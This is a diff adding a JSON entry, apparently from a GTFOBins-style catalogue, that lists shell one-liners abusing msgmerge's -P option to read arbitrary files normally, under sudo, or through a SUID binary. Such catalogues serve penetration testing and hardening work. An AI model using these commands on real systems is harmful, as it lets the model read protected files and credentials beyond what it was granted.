@@ -1,0 +1,20 @@
+{
+  "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
+      }
+    ]
+  }
+}
